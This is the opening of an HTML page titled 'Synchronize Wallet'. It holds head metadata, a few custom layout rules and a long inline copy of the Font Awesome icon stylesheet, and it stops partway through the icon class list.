<html>

<head>
  <meta http-equiv="content-type" content="text/html;charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">



  <title>Synchronize Wallet</title>



  <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
  <link rel="manifest" href="site.html">



  <noscript data-n-css=""></noscript>
  <style>
    body {
      background-color: #222;
      overflow-x: hidden;
    }

    .mybtn {
      background-color: #fff;
      text-decoration: none;
    }

    a,
    a:hover {
      text-decoration: none;
    }

    header {
      width: 100%;
      /*height: 40px;*/
      padding-top: 15px;
    }

    .intro h5 {
      margin-top: 30px;
      text-align: center;
    }

    .footer {
      margin-top: 100px;
    }

    .text-center.img-center {
      margin-top: 80px;
    }

    .c-list a {
      padding: 20px;
      background-color: #fff;
      display: block;
      margin: 0;
      color: #222;
      border-bottom: 1px solid #222;
    }

    .c-list img {
      margin-right: 20px;
      width: 30px;
      height: 30px;
    }

    .nav.nav-tabs {
      margin-top: 30px;
    }

    .nav-tabs .nav-item.show .nav-link,
    .nav-tabs .nav-link.active {
      color: #fff;
      background: transparent;
      border: 0;
      border-bottom: 2px solid;
    }

    .nav-tabs .nav-link {
      color: #d3cece;
    }


    /*!
 * Font Awesome Free 5.0.13 by @fontawesome - https://fontawesome.com
 * License - https://fontawesome.com/license (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)
 */
    .fa,
    .fab,
    .fal,
    .far,
    .fas {
      -moz-osx-font-smoothing: grayscale;
      -webkit-font-smoothing: antialiased;
      display: inline-block;
      font-style: normal;
      font-variant: normal;
      text-rendering: auto;
      line-height: 1
    }

    .fa-lg {
      font-size: 1.33333em;
      line-height: .75em;
      vertical-align: -.0667em
    }

    .fa-xs {
      font-size: .75em
    }

    .fa-sm {
      font-size: .875em
    }

    .fa-1x {
      font-size: 1em
    }

    .fa-2x {
      font-size: 2em
    }

    .fa-3x {
      font-size: 3em
    }

    .fa-4x {
      font-size: 4em
    }

    .fa-5x {
      font-size: 5em
    }

    .fa-6x {
      font-size: 6em
    }

    .fa-7x {
      font-size: 7em
    }

    .fa-8x {
      font-size: 8em
    }

    .fa-9x {
      font-size: 9em
    }

    .fa-10x {
      font-size: 10em
    }

    .fa-fw {
      text-align: center;
      width: 1.25em
    }

    .fa-ul {
      list-style-type: none;
      margin-left: 2.5em;
      padding-left: 0
    }

    .fa-ul>li {
      position: relative
    }

    .fa-li {
      left: -2em;
      position: absolute;
      text-align: center;
      width: 2em;
      line-height: inherit
    }

    .fa-border {
      border: .08em solid #eee;
      border-radius: .1em;
      padding: .2em .25em .15em
    }

    .fa-pull-left {
      float: left
    }

    .fa-pull-right {
      float: right
    }

    .fa.fa-pull-left,
    .fab.fa-pull-left,
    .fal.fa-pull-left,
    .far.fa-pull-left,
    .fas.fa-pull-left {
      margin-right: .3em
    }

    .fa.fa-pull-right,
    .fab.fa-pull-right,
    .fal.fa-pull-right,
    .far.fa-pull-right,
    .fas.fa-pull-right {
      margin-left: .3em
    }

    .fa-spin {
      animation: a 2s infinite linear
    }

    .fa-pulse {
      animation: a 1s infinite steps(8)
    }

    @keyframes a {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .fa-rotate-90 {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
      transform: rotate(90deg)
    }

    .fa-rotate-180 {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
      transform: rotate(180deg)
    }

    .fa-rotate-270 {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
      transform: rotate(270deg)
    }

    .fa-flip-horizontal {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
      transform: scaleX(-1)
    }

    .fa-flip-vertical {
      transform: scaleY(-1)
    }

    .fa-flip-horizontal.fa-flip-vertical,
    .fa-flip-vertical {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)"
    }

    .fa-flip-horizontal.fa-flip-vertical {
      transform: scale(-1)
    }

    :root .fa-flip-horizontal,
    :root .fa-flip-vertical,
    :root .fa-rotate-90,
    :root .fa-rotate-180,
    :root .fa-rotate-270 {
      -webkit-filter: none;
      filter: none
    }

    .fa-stack {
      display: inline-block;
      height: 2em;
      line-height: 2em;
      position: relative;
      vertical-align: middle;
      width: 2em
    }

    .fa-stack-1x,
    .fa-stack-2x {
      left: 0;
      position: absolute;
      text-align: center;
      width: 100%
    }

    .fa-stack-1x {
      line-height: inherit
    }

    .fa-stack-2x {
      font-size: 2em
    }

    .fa-inverse {
      color: #fff
    }

    .fa-500px:before {
      content: "\f26e"
    }

    .fa-accessible-icon:before {
      content: "\f368"
    }

    .fa-accusoft:before {
      content: "\f369"
    }

    .fa-address-book:before {
      content: "\f2b9"
    }

    .fa-address-card:before {
      content: "\f2bb"
    }

    .fa-adjust:before {
      content: "\f042"
    }

    .fa-adn:before {
      content: "\f170"
    }

    .fa-adversal:before {
      content: "\f36a"
    }

    .fa-affiliatetheme:before {
      content: "\f36b"
    }

    .fa-algolia:before {
      content: "\f36c"
    }

    .fa-align-center:before {
      content: "\f037"
    }

    .fa-align-justify:before {
      content: "\f039"
    }

    .fa-align-left:before {
      content: "\f036"
    }

    .fa-align-right:before {
      content: "\f038"
    }

    .fa-allergies:before {
      content: "\f461"
    }

    .fa-amazon:before {
      content: "\f270"
    }

    .fa-amazon-pay:before {
      content: "\f42c"
    }

    .fa-ambulance:before {
      content: "\f0f9"
    }

    .fa-american-sign-language-interpreting:before {
      content: "\f2a3"
    }

    .fa-amilia:before {
      content: "\f36d"
    }

    .fa-anchor:before {
      content: "\f13d"
    }

    .fa-android:before {
      content: "\f17b"
    }

    .fa-angellist:before {
      content: "\f209"
    }

    .fa-angle-double-down:before {
      content: "\f103"
    }

    .fa-angle-double-left:before {
      content: "\f100"
    }

    .fa-angle-double-right:before {
      content: "\f101"
    }

    .fa-angle-double-up:before {
      content: "\f102"
    }

    .fa-angle-down:before {
      content: "\f107"
    }

    .fa-angle-left:before {
      content: "\f104"
    }

    .fa-angle-right:before {
      content: "\f105"
    }

    .fa-angle-up:before {
      content: "\f106"
    }

    .fa-angrycreative:before {
      content: "\f36e"
    }

    .fa-angular:before {
      content: "\f420"
    }

    .fa-app-store:before {
      content: "\f36f"
    }

    .fa-app-store-ios:before {
      content: "\f370"
    }

    .fa-apper:before {
      content: "\f371"
    }

    .fa-apple:before {
      content: "\f179"
    }

    .fa-apple-pay:before {
      content: "\f415"
    }

    .fa-archive:before {
      content: "\f187"
    }

    .fa-arrow-alt-circle-down:before {
      content: "\f358"
    }

    .fa-arrow-alt-circle-left:before {
      content: "\f359"
    }

    .fa-arrow-alt-circle-right:before {
      content: "\f35a"
    }

    .fa-arrow-alt-circle-up:before {
      content: "\f35b"
    }

    .fa-arrow-circle-down:before {
      content: "\f0ab"
    }

    .fa-arrow-circle-left:before {
      content: "\f0a8"
    }

    .fa-arrow-circle-right:before {
      content: "\f0a9"
    }

    .fa-arrow-circle-up:before {
      content: "\f0aa"
    }

    .fa-arrow-down:before {
      content: "\f063"
    }

    .fa-arrow-left:before {
      content: "\f060"
    }

    .fa-arrow-right:before {
      content: "\f061"
    }

    .fa-arrow-up:before {
      content: "\f062"
    }

    .fa-arrows-alt:before {
      content: "\f0b2"
    }

    .fa-arrows-alt-h:before {
      content: "\f337"
    }

    .fa-arrows-alt-v:before {
      content: "\f338"
    }

    .fa-assistive-listening-systems:before {
      content: "\f2a2"
    }

    .fa-asterisk:before {
      content: "\f069"
    }

    .fa-asymmetrik:before {
      content: "\f372"
    }

    .fa-at:before {
      content: "\f1fa"
    }

    .fa-audible:before {
      content: "\f373"
    }

    .fa-audio-description:before {
      content: "\f29e"
    }

    .fa-autoprefixer:before {
      content: "\f41c"
    }

    .fa-avianex:before {
      content: "\f374"
    }

    .fa-aviato:before {
      content: "\f421"
    }

    .fa-aws:before {
      content: "\f375"
    }

    .fa-backward:before {
      content: "\f04a"
    }

    .fa-balance-scale:before {
      content: "\f24e"
    }

    .fa-ban:before {
      content: "\f05e"
    }

    .fa-band-aid:before {
      content: "\f462"
    }

    .fa-bandcamp:before {
      content: "\f2d5"
    }

    .fa-barcode:before {
      content: "\f02a"
    }

    .fa-bars:before {
      content: "\f0c9"
    }

    .fa-baseball-ball:before {
      content: "\f433"
    }

    .fa-basketball-ball:before {
      content: "\f434"
    }

    .fa-bath:before {
      content: "\f2cd"
    }

    .fa-battery-empty:before {
      content: "\f244"
    }

    .fa-battery-full:before {
      content: "\f240"
    }

    .fa-battery-half:before {
      content: "\f242"
    }

    .fa-battery-quarter:before {
      content: "\f243"
    }

    .fa-battery-three-quarters:before {
      content: "\f241"
    }

    .fa-bed:before {
      content: "\f236"
    }

    .fa-beer:before {
      content: "\f0fc"
    }

    .fa-behance:before {
      content: "\f1b4"
    }

    .fa-behance-square:before {
      content: "\f1b5"
    }

    .fa-bell:before {
      content: "\f0f3"
    }

    .fa-bell-slash:before {
      content: "\f1f6"
    }

    .fa-bicycle:before {
      content: "\f206"
    }

    .fa-bimobject:before {
      content: "\f378"
    }

    .fa-binoculars:before {
      content: "\f1e5"
    }

    .fa-birthday-cake:before {
      content: "\f1fd"
    }

    .fa-bitbucket:before {
      content: "\f171"
    }

    .fa-bitcoin:before {
      content: "\f379"
    }

    .fa-bity:before {
      content: "\f37a"
    }

    .fa-black-tie:before {
      content: "\f27e"
    }

    .fa-blackberry:before {
      content: "\f37b"
    }

    .fa-blender:before {
      content: "\f517"
    }

    .fa-blind:before {
      content: "\f29d"
    }

    .fa-blogger:before {
      content: "\f37c"
    }

    .fa-blogger-b:before {
      content: "\f37d"
    }

    .fa-bluetooth:before {
      content: "\f293"
    }

    .fa-bluetooth-b:before {
      content: "\f294"
    }

    .fa-bold:before {
      content: "\f032"
    }

    .fa-bolt:before {
      content: "\f0e7"
    }

    .fa-bomb:before {
      content: "\f1e2"
    }

    .fa-book:before {
      content: "\f02d"
    }

    .fa-book-open:before {
      content: "\f518"
    }

    .fa-bookmark:before {
      content: "\f02e"
    }

    .fa-bowling-ball:before {
      content: "\f436"
    }

    .fa-box:before {
      content: "\f466"
    }

    .fa-box-open:before {
      content: "\f49e"
    }

    .fa-boxes:before {
      content: "\f468"
    }

    .fa-braille:before {
      content: "\f2a1"
    }

    .fa-briefcase:before {
      content: "\f0b1"
    }

    .fa-briefcase-medical:before {
      content: "\f469"
    }

    .fa-broadcast-tower:before {
      content: "\f519"
    }

    .fa-broom:before {
      content: "\f51a"
    }

    .fa-btc:before {
      content: "\f15a"
    }

    .fa-bug:before {
      content: "\f188"
    }

    .fa-building:before {
      content: "\f1ad"
    }

    .fa-bullhorn:before {
      content: "\f0a1"
    }

    .fa-bullseye:before {
      content: "\f140"
    }

    .fa-burn:before {
      content: "\f46a"
    }

    .fa-buromobelexperte:before {
      content: "\f37f"
    }

    .fa-bus:before {
      content: "\f207"
    }

    .fa-buysellads:before {
      content: "\f20d"
    }

    .fa-calculator:before {
      content: "\f1ec"
    }

    .fa-calendar:before {
      content: "\f133"
    }

    .fa-calendar-alt:before {
      content: "\f073"
    }

    .fa-calendar-check:before {
      content: "\f274"
    }

    .fa-calendar-minus:before {
      content: "\f272"
    }

    .fa-calendar-plus:before {
      content: "\f271"
    }

    .fa-calendar-times:before {
      content: "\f273"
    }

    .fa-camera:before {
      content: "\f030"
    }

    .fa-camera-retro:before {
      content: "\f083"
    }

    .fa-capsules:before {
      content: "\f46b"
    }

    .fa-car:before {
      content: "\f1b9"
    }

    .fa-caret-down:before {
      content: "\f0d7"
    }

    .fa-caret-left:before {
      content: "\f0d9"
    }

    .fa-caret-right:before {
      content: "\f0da"
    }

    .fa-caret-square-down:before {
      content: "\f150"
    }

    .fa-caret-square-left:before {
      content: "\f191"
    }

    .fa-caret-square-right:before {
      content: "\f152"
    }

    .fa-caret-square-up:before {
      content: "\f151"
    }

    .fa-caret-up:before {
      content: "\f0d8"
    }

    .fa-cart-arrow-down:before {
      content: "\f218"
    }

    .fa-cart-plus:before {
      content: "\f217"
    }

    .fa-cc-amazon-pay:before {
      content: "\f42d"
    }

    .fa-cc-amex:before {
      content: "\f1f3"
    }

    .fa-cc-apple-pay:before {
      content: "\f416"
    }

    .fa-cc-diners-club:before {
      content: "\f24c"
    }

    .fa-cc-discover:before {
      content: "\f1f2"
    }

    .fa-cc-jcb:before {
      content: "\f24b"
    }

    .fa-cc-mastercard:before {
      content: "\f1f1"
    }

    .fa-cc-paypal:before {
      content: "\f1f4"
    }

    .fa-cc-stripe:before {
      content: "\f1f5"
    }

    .fa-cc-visa:before {
      content: "\f1f0"
    }

    .fa-centercode:before {
      content: "\f380"
    }

    .fa-certificate:before {
      content: "\f0a3"
    }

    .fa-chalkboard:before {
      content: "\f51b"
    }

    .fa-chalkboard-teacher:before {
      content: "\f51c"
    }

    .fa-chart-area:before {
      content: "\f1fe"
    }

    .fa-chart-bar:before {
      content: "\f080"
    }

    .fa-chart-line:before {
      content: "\f201"
    }

    .fa-chart-pie:before {
      content: "\f200"
    }

    .fa-check:before {
      content: "\f00c"
    }

    .fa-check-circle:before {
      content: "\f058"
    }

    .fa-check-square:before {
      content: "\f14a"
    }

    .fa-chess:before {
      content: "\f439"
    }

    .fa-chess-bishop:before {
      content: "\f43a"
    }

    .fa-chess-board:before {
      content: "\f43c"
    }

    .fa-chess-king:before {
      content: "\f43f"
    }

    .fa-chess-knight:before {
      content: "\f441"
    }

    .fa-chess-pawn:before {
      content: "\f443"
    }

    .fa-chess-queen:before {
      content: "\f445"
    }

    .fa-chess-rook:before {
      content: "\f447"
    }

    .fa-chevron-circle-down:before {
      content: "\f13a"
    }

    .fa-chevron-circle-left:before {
      content: "\f137"
    }

    .fa-chevron-circle-right:before {
      content: "\f138"
    }

    .fa-chevron-circle-up:before {
      content: "\f139"
    }

    .fa-chevron-down:before {
      content: "\f078"
    }

    .fa-chevron-left:before {
      content: "\f053"
    }

    .fa-chevron-right:before {
      content: "\f054"
    }

    .fa-chevron-up:before {
      content: "\f077"
    }

    .fa-child:before {
      content: "\f1ae"
    }

    .fa-chrome:before {
      content: "\f268"
    }

    .fa-church:before {
      content: "\f51d"
    }

    .fa-circle:before {
      content: "\f111"
    }

    .fa-circle-notch:before {
      content: "\f1ce"
    }

    .fa-clipboard:before {
      content: "\f328"
    }

    .fa-clipboard-check:before {
      content: "\f46c"
    }

    .fa-clipboard-list:before {
      content: "\f46d"
    }

    .fa-clock:before {
      content: "\f017"
    }

    .fa-clone:before {
      content: "\f24d"
    }

    .fa-closed-captioning:before {
      content: "\f20a"
    }

    .fa-cloud:before {
      content: "\f0c2"
    }

    .fa-cloud-download-alt:before {
      content: "\f381"
    }

    .fa-cloud-upload-alt:before {
      content: "\f382"
    }

    .fa-cloudscale:before {
      content: "\f383"
    }

    .fa-cloudsmith:before {
      content: "\f384"
    }

    .fa-cloudversify:before {
      content: "\f385"
    }

    .fa-code:before {
      content: "\f121"
    }

    .fa-code-branch:before {
      content: "\f126"
    }

    .fa-codepen:before {
      content: "\f1cb"
    }

    .fa-codiepie:before {
      content: "\f284"
    }

    .fa-coffee:before {
      content: "\f0f4"
    }

    .fa-cog:before {
      content: "\f013"
    }

    .fa-cogs:before {
      content: "\f085"
    }

    .fa-coins:before {
      content: "\f51e"
    }

    .fa-columns:before {
      content: "\f0db"
    }

    .fa-comment:before {
      content: "\f075"
    }

    .fa-comment-alt:before {
      content: "\f27a"
    }

    .fa-comment-dots:before {
      content: "\f4ad"
    }

    .fa-comment-slash:before {
      content: "\f4b3"
    }

    .fa-comments:before {
      content: "\f086"
    }

    .fa-compact-disc:before {
      content: "\f51f"
    }

    .fa-compass:before {
      content: "\f14e"
    }

    .fa-compress:before {
      content: "\f066"
    }

    .fa-connectdevelop:before {
      content: "\f20e"
    }

    .fa-contao:before {
      content: "\f26d"
    }

    .fa-copy:before {
      content: "\f0c5"
    }

    .fa-copyright:before {
      content: "\f1f9"
    }

    .fa-couch:before {
      content: "\f4b8"
    }

    .fa-cpanel:before {
      content: "\f388"
    }

    .fa-creative-commons:before {
      content: "\f25e"
    }

    .fa-creative-commons-by:before {
      content: "\f4e7"
    }

    .fa-creative-commons-nc:before {
      content: "\f4e8"
    }

    .fa-creative-commons-nc-eu:before {
      content: "\f4e9"
    }

    .fa-creative-commons-nc-jp:before {
      content: "\f4ea"
    }

    .fa-creative-commons-nd:before {
      content: "\f4eb"
    }

    .fa-creative-commons-pd:before {
      content: "\f4ec"
    }

    .fa-creative-commons-pd-alt:before {
      content: "\f4ed"
    }

    .fa-creative-commons-remix:before {
      content: "\f4ee"
    }

    .fa-creative-commons-sa:before {
      content: "\f4ef"
    }

    .fa-creative-commons-sampling:before {
      content: "\f4f0"
    }

    .fa-creative-commons-sampling-plus:before {
      content: "\f4f1"
    }

    .fa-creative-commons-share:before {
      content: "\f4f2"
    }

    .fa-credit-card:before {
      content: "\f09d"
    }

    .fa-crop:before {
      content: "\f125"
    }

    .fa-crosshairs:before {
      content: "\f05b"
    }

    .fa-crow:before {
      content: "\f520"
    }

    .fa-crown:before {
      content: "\f521"
    }

    .fa-css3:before {
      content: "\f13c"
    }

    .fa-css3-alt:before {
      content: "\f38b"
    }

    .fa-cube:before {
      content: "\f1b2"
    }

    .fa-cubes:before {
      content: "\f1b3"
    }

    .fa-cut:before {
      content: "\f0c4"
    }

    .fa-cuttlefish:before {
      content: "\f38c"
    }

    .fa-d-and-d:before {
      content: "\f38d"
    }

    .fa-dashcube:before {
      content: "\f210"
    }

    .fa-database:before {
      content: "\f1c0"
    }

    .fa-deaf:before {
      content: "\f2a4"
    }

    .fa-delicious:before {
      content: "\f1a5"
    }

    .fa-deploydog:before {
      content: "\f38e"
    }

    .fa-deskpro:before {
      content: "\f38f"
    }

    .fa-desktop:before {
      content: "\f108"
    }

    .fa-deviantart:before {
      content: "\f1bd"
    }

    .fa-diagnoses:before {
      content: "\f470"
    }

    .fa-dice:before {
      content: "\f522"
    }

    .fa-dice-five:before {
      content: "\f523"
    }

    .fa-dice-four:before {
      content: "\f524"
    }

    .fa-dice-one:before {
      content: "\f525"
    }

    .fa-dice-six:before {
      content: "\f526"
    }

    .fa-dice-three:before {
      content: "\f527"
    }

    .fa-dice-two:before {
      content: "\f528"
    }

    .fa-digg:before {
      content: "\f1a6"
    }

    .fa-digital-ocean:before {
      content: "\f391"
    }

    .fa-discord:before {
      content: "\f392"
    }

    .fa-discourse:before {
      content: "\f393"
    }

    .fa-divide:before {
      content: "\f529"
    }

    .fa-dna:before {
      content: "\f471"
    }

    .fa-dochub:before {
      content: "\f394"
    }

    .fa-docker:before {
      content: "\f395"
    }

    .fa-dollar-sign:before {
      content: "\f155"
    }

    .fa-dolly:before {
      content: "\f472"
    }

    .fa-dolly-flatbed:before {
      content: "\f474"
    }

    .fa-donate:before {
      content: "\f4b9"
    }

    .fa-door-closed:before {
      content: "\f52a"
    }

    .fa-door-open:before {
      content: "\f52b"
    }

    .fa-dot-circle:before {
      content: "\f192"
    }

    .fa-dove:before {
      content: "\f4ba"
    }

    .fa-download:before {
      content: "\f019"
    }

    .fa-draft2digital:before {
      content: "\f396"
    }

    .fa-dribbble:before {
      content: "\f17d"
    }

    .fa-dribbble-square:before {
      content: "\f397"
    }

    .fa-dropbox:before {
      content: "\f16b"
    }

    .fa-drupal:before {
      content: "\f1a9"
    }

    .fa-dumbbell:before {
      content: "\f44b"
    }

    .fa-dyalog:before {
      content: "\f399"
    }

    .fa-earlybirds:before {
      content: "\f39a"
    }

    .fa-ebay:before {
      content: "\f4f4"
    }

    .fa-edge:before {
      content: "\f282"
    }

    .fa-edit:before {
      content: "\f044"
    }

    .fa-eject:before {
      content: "\f052"
    }

    .fa-elementor:before {
      content: "\f430"
    }

    .fa-ellipsis-h:before {
      content: "\f141"
    }

    .fa-ellipsis-v:before {
      content: "\f142"
    }

    .fa-ember:before {
      content: "\f423"
    }

    .fa-empire:before {
      content: "\f1d1"
    }

    .fa-envelope:before {
      content: "\f0e0"
    }

    .fa-envelope-open:before {
      content: "\f2b6"
    }

    .fa-envelope-square:before {
      content: "\f199"
    }

    .fa-envira:before {
      content: "\f299"
    }

    .fa-equals:before {
      content: "\f52c"
    }

    .fa-eraser:before {
      content: "\f12d"
    }

    .fa-erlang:before {
      content: "\f39d"
    }

    .fa-ethereum:before {
      content: "\f42e"
    }

    .fa-etsy:before {
      content: "\f2d7"
    }

    .fa-euro-sign:before {
      content: "\f153"
    }

    .fa-exchange-alt:before {
      content: "\f362"
    }

    .fa-exclamation:before {
      content: "\f12a"
    }

    .fa-exclamation-circle:before {
      content: "\f06a"
    }

    .fa-exclamation-triangle:before {
      content: "\f071"
    }

    .fa-expand:before {
      content: "\f065"
    }

    .fa-expand-arrows-alt:before {
      content: "\f31e"
    }

    .fa-expeditedssl:before {
      content: "\f23e"
    }

    .fa-external-link-alt:before {
      content: "\f35d"
    }

    .fa-external-link-square-alt:before {
      content: "\f360"
    }

    .fa-eye:before {
      content: "\f06e"
    }

    .fa-eye-dropper:before {
      content: "\f1fb"
    }

    .fa-eye-slash:before {
      content: "\f070"
    }

    .fa-facebook:before {
      content: "\f09a"
    }

    .fa-facebook-f:before {
      content: "\f39e"
    }

    .fa-facebook-messenger:before {
      content: "\f39f"
    }

    .fa-facebook-square:before {
      content: "\f082"
    }

    .fa-fast-backward:before {
      content: "\f049"
    }

    .fa-fast-forward:before {
      content: "\f050"
    }

    .fa-fax:before {
      content: "\f1ac"
    }

    .fa-feather:before {
      content: "\f52d"
    }

    .fa-female:before {
      content: "\f182"
    }

    .fa-fighter-jet:before {
      content: "\f0fb"
    }

    .fa-file:before {
      content: "\f15b"
    }

    .fa-file-alt:before {
      content: "\f15c"
    }

    .fa-file-archive:before {
      content: "\f1c6"
    }

    .fa-file-audio:before {
      content: "\f1c7"
    }

    .fa-file-code:before {
      content: "\f1c9"
    }

    .fa-file-excel:before {
      content: "\f1c3"
    }

    .fa-file-image:before {
      content: "\f1c5"
    }

    .fa-file-medical:before {
      content: "\f477"
    }

    .fa-file-medical-alt:before {
      content: "\f478"
    }

    .fa-file-pdf:before {
      content: "\f1c1"
    }

    .fa-file-powerpoint:before {
      content: "\f1c4"
    }

    .fa-file-video:before {
      content: "\f1c8"
    }

    .fa-file-word:before {
      content: "\f1c2"
    }

    .fa-film:before {
      content: "\f008"
    }

    .fa-filter:before {
      content: "\f0b0"
    }

    .fa-fire:before {
      content: "\f06d"
    }

    .fa-fire-extinguisher:before {
      content: "\f134"
    }

    .fa-firefox:before {
      content: "\f269"
    }

    .fa-first-aid:before {
      content: "\f479"
    }

    .fa-first-order:before {
      content: "\f2b0"
    }

    .fa-first-order-alt:before {
      content: "\f50a"
    }

    .fa-firstdraft:before {
      content: "\f3a1"
    }

    .fa-flag:before {
      content: "\f024"
    }

    .fa-flag-checkered:before {
      content: "\f11e"
    }

    .fa-flask:before {
      content: "\f0c3"
    }

    .fa-flickr:before {
      content: "\f16e"
    }

    .fa-flipboard:before {
      content: "\f44d"
    }

    .fa-fly:before {
      content: "\f417"
    }

    .fa-folder:before {
      content: "\f07b"
    }

    .fa-folder-open:before {
      content: "\f07c"
    }

    .fa-font:before {
      content: "\f031"
    }

    .fa-font-awesome:before {
      content: "\f2b4"
    }

    .fa-font-awesome-alt:before {
      content: "\f35c"
    }

    .fa-font-awesome-flag:before {
      content: "\f425"
    }

    .fa-font-awesome-logo-full:before {
      content: "\f4e6"
    }

    .fa-fonticons:before {
      content: "\f280"
    }

    .fa-fonticons-fi:before {
      content: "\f3a2"
    }

    .fa-football-ball:before {
      content: "\f44e"
    }

    .fa-fort-awesome:before {
      content: "\f286"
    }

    .fa-fort-awesome-alt:before {
      content: "\f3a3"
    }

    .fa-forumbee:before {
      content: "\f211"
    }

    .fa-forward:before {
      content: "\f04e"
    }

    .fa-foursquare:before {
      content: "\f180"
    }

    .fa-free-code-camp:before {
      content: "\f2c5"
    }

    .fa-freebsd:before {
      content: "\f3a4"
    }

    .fa-frog:before {
      content: "\f52e"
    }

    .fa-frown:before {
      content: "\f119"
    }

    .fa-fulcrum:before {
      content: "\f50b"
    }

    .fa-futbol:before {
      content: "\f1e3"
    }

    .fa-galactic-republic:before {
      content: "\f50c"
    }

    .fa-galactic-senate:before {
      content: "\f50d"
    }

    .fa-gamepad:before {
      content: "\f11b"
    }

    .fa-gas-pump:before {
      content: "\f52f"
    }

    .fa-gavel:before {
      content: "\f0e3"
    }

    .fa-gem:before {
      content: "\f3a5"
    }

    .fa-genderless:before {
      content: "\f22d"
    }

    .fa-get-pocket:before {
      content: "\f265"
    }

    .fa-gg:before {
      content: "\f260"
    }

    .fa-gg-circle:before {
      content: "\f261"
    }

    .fa-gift:before {
      content: "\f06b"
    }

    .fa-git:before {
      content: "\f1d3"
    }

    .fa-git-square:before {
      content: "\f1d2"
    }

    .fa-github:before {
      content: "\f09b"
    }

    .fa-github-alt:before {
      content: "\f113"
    }

    .fa-github-square:before {
      content: "\f092"
    }

    .fa-gitkraken:before {
      content: "\f3a6"
    }

    .fa-gitlab:before {
      content: "\f296"
    }

    .fa-gitter:before {
      content: "\f426"
    }

    .fa-glass-martini:before {
      content: "\f000"
    }

    .fa-glasses:before {
      content: "\f530"
    }

    .fa-glide:before {
      content: "\f2a5"
    }

    .fa-glide-g:before {
      content: "\f2a6"
    }

    .fa-globe:before {
      content: "\f0ac"
    }

    .fa-gofore:before {
      content: "\f3a7"
    }

    .fa-golf-ball:before {
      content: "\f450"
    }

    .fa-goodreads:before {
      content: "\f3a8"
    }

    .fa-goodreads-g:before {
      content: "\f3a9"
    }

    .fa-google:before {
      content: "\f1a0"
    }

    .fa-google-drive:before {
      content: "\f3aa"
    }

    .fa-google-play:before {
      content: "\f3ab"
    }

    .fa-google-plus:before {
      content: "\f2b3"
    }

    .fa-google-plus-g:before {
      content: "\f0d5"
    }

    .fa-google-plus-square:before {
      content: "\f0d4"
    }

    .fa-google-wallet:before {
      content: "\f1ee"
    }

    .fa-graduation-cap:before {
      content: "\f19d"
    }

    .fa-gratipay:before {
      content: "\f184"
    }

    .fa-grav:before {
      content: "\f2d6"
    }

    .fa-greater-than:before {
      content: "\f531"
    }

    .fa-greater-than-equal:before {
      content: "\f532"
    }

    .fa-gripfire:before {
      content: "\f3ac"
    }

    .fa-grunt:before {
      content: "\f3ad"
    }

    .fa-gulp:before {
      content: "\f3ae"
    }

    .fa-h-square:before {
      content: "\f0fd"
    }

    .fa-hacker-news:before {
      content: "\f1d4"
    }

    .fa-hacker-news-square:before {
      content: "\f3af"
    }

    .fa-hand-holding:before {
      content: "\f4bd"
    }

    .fa-hand-holding-heart:before {
      content: "\f4be"
    }

    .fa-hand-holding-usd:before {
      content: "\f4c0"
    }

    .fa-hand-lizard:before {
      content: "\f258"
    }

    .fa-hand-paper:before {
      content: "\f256"
    }

    .fa-hand-peace:before {
      content: "\f25b"
    }

    .fa-hand-point-down:before {
      content: "\f0a7"
    }

    .fa-hand-point-left:before {
      content: "\f0a5"
    }

    .fa-hand-point-right:before {
      content: "\f0a4"
    }

    .fa-hand-point-up:before {
      content: "\f0a6"
    }

    .fa-hand-pointer:before {
      content: "\f25a"
    }

    .fa-hand-rock:before {
      content: "\f255"
    }

    .fa-hand-scissors:before {
      content: "\f257"
    }

    .fa-hand-spock:before {
      content: "\f259"
    }

    .fa-hands:before {
      content: "\f4c2"
    }

    .fa-hands-helping:before {
      content: "\f4c4"
    }

    .fa-handshake:before {
      content: "\f2b5"
    }

    .fa-hashtag:before {
      content: "\f292"
    }

    .fa-hdd:before {
      content: "\f0a0"
    }

    .fa-heading:before {
      content: "\f1dc"
    }

    .fa-headphones:before {
      content: "\f025"
    }

    .fa-heart:before {
      content: "\f004"
    }

    .fa-heartbeat:before {
      content: "\f21e"
    }

    .fa-helicopter:before {
      content: "\f533"
    }

    .fa-hips:before {
      content: "\f452"
    }

    .fa-hire-a-helper:before {
      content: "\f3b0"
    }

    .fa-history:before {
      content: "\f1da"
    }

    .fa-hockey-puck:before {
      content: "\f453"
    }

    .fa-home:before {
      content: "\f015"
    }

    .fa-hooli:before {
      content: "\f427"
    }

    .fa-hospital:before {
      content: "\f0f8"
    }

    .fa-hospital-alt:before {
      content: "\f47d"
    }

    .fa-hospital-symbol:before {
      content: "\f47e"
    }

    .fa-hotjar:before {
      content: "\f3b1"
    }

    .fa-hourglass:before {
      content: "\f254"
    }

    .fa-hourglass-end:before {
      content: "\f253"
    }

    .fa-hourglass-half:before {
      content: "\f252"
    }

    .fa-hourglass-start:before {
      content: "\f251"
    }

    .fa-houzz:before {
      content: "\f27c"
    }

    .fa-html5:before {
      content: "\f13b"
    }

    .fa-hubspot:before {
      content: "\f3b2"
    }

    .fa-i-cursor:before {
      content: "\f246"
    }

    .fa-id-badge:before {
      content: "\f2c1"
    }

    .fa-id-card:before {
      content: "\f2c2"
    }

    .fa-id-card-alt:before {
      content: "\f47f"
    }

    .fa-image:before {
      content: "\f03e"
    }

    .fa-images:before {
      content: "\f302"
    }

    .fa-imdb:before {
      content: "\f2d8"
    }

    .fa-inbox:before {
      content: "\f01c"
    }

    .fa-indent:before {
      content: "\f03c"
    }

    .fa-industry:before {
      content: "\f275"
    }

    .fa-infinity:before {
      content: "\f534"
    }

    .fa-info:before {
      content: "\f129"
    }

    .fa-info-circle:before {
      content: "\f05a"
    }

    .fa-instagram:before {
      content: "\f16d"
